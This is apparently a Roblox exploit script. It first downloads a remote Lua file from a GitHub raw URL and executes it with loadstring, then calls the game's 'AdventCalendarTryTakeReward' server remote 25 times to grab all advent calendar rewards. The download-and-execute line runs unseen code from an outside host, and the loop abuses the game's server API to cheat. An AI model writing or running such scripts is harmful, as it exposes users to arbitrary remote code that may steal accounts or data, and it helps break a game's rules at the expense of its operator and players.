loadstring(game:HttpGet(('https://raw.githubusercontent.com/Spinzox/main/refs/heads/main/script.lua'),true))()
wait(15)
for i = 1, 25 do
    local args = {i}  
    game:GetService("ReplicatedStorage").API:FindFirstChild("WinterfestAPI/AdventCalendarTryTakeReward"):InvokeServer(unpack(args))
    wait(0.3)  
end
